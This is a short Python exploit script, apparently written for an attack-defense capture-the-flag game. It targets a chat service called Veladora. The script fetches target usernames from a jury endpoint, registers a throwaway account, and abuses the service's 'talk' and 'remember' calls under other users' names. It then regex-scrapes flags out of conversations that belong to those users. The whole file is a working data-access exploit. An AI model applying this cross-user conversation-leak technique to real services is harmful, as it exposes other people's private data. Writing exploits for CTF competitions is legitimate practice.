#!/usr/bin/env python3
from api_client import VeladoraClient
import sys
import os
import requests
import re

flag_re = r'TEAM[0-9]{3}_[A-Z0-9]{32}'

X_TEAM_TOKEN = ''
JURY_URL = 'http://<ip>/flag_ids?service=4'

def get_flag_ids(team_token: str, url: str, attack_host: str):
    import json
    resp = requests.get(url, headers={'X-Team-Token':team_token})
    flag_ids = json.loads(resp.text)['flag_ids']
    for i in flag_ids:
        if flag_ids[i]['host'] == attack_host:
            return flag_ids[i]['flag_ids']

def exploit(hostname: str, users: str):
    client = VeladoraClient(f"http://{hostname}")
    attack_user = os.urandom(16).hex()
    attack_password = os.urandom(16).hex()

    client.register(attack_user, attack_password)
    client.login(attack_user, attack_password)
    context_token = os.urandom(16).hex()

    for username in users:
        client.talk("Remember this conversation: " + context_token, username)
        conversations = client.remember(context_token, username)
        try:
            print(re.findall(flag_re, conversations.get('conversations')[0].get('content'))[0], flush=True)
        except:
            continue

if __name__ == '__main__':
    users = get_flag_ids(X_TEAM_TOKEN, JURY_URL, sys.argv[1])
    exploit(sys.argv[1], users)
